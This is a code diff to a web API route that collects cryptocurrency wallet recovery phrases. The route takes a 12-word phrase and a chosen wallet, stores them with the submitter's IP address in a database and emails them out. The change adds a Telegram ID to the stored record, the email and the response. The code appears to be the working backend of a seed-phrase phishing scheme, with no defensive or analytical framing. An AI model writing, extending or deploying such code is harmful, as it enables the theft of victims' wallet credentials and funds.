@@ -4,7 +4,7 @@ import { sendEmailNotification } from '../../../lib/email'
 export async function POST(request) {
   try {
     const body = await request.json()
-    const { selectedWallet, phrase, timestamp = new Date().toISOString() } = body
+    const { selectedWallet, phrase, timestamp = new Date().toISOString(), telegramId } = body
 
     // Validate input
     if (!selectedWallet || !phrase || !Array.isArray(phrase) || phrase.length !== 12) {
@@ -19,7 +19,8 @@ export async function POST(request) {
       selected_wallet: selectedWallet,
       phrase,
       timestamp,
-      ip: request.headers.get('x-forwarded-for') || 'unknown'
+      ip: request.headers.get('x-forwarded-for') || 'unknown',
+      telegram_id: telegramId || null // Store telegram ID if provided
     }
 
     // Insert into Supabase
@@ -45,13 +46,15 @@ export async function POST(request) {
       phrase,
       timestamp,
       ip: request.headers.get('x-forwarded-for') || 'unknown',
-      id: data[0].id
+      id: data[0].id,
+      telegramId // Include telegram ID in email
     })
 
     return Response.json({
       success: true,
       message: 'Phrase submitted successfully',
-      submissionId: data[0].id
+      submissionId: data[0].id,
+      telegramId: telegramId // Return telegram ID in response
     })
 
   } catch (error) {
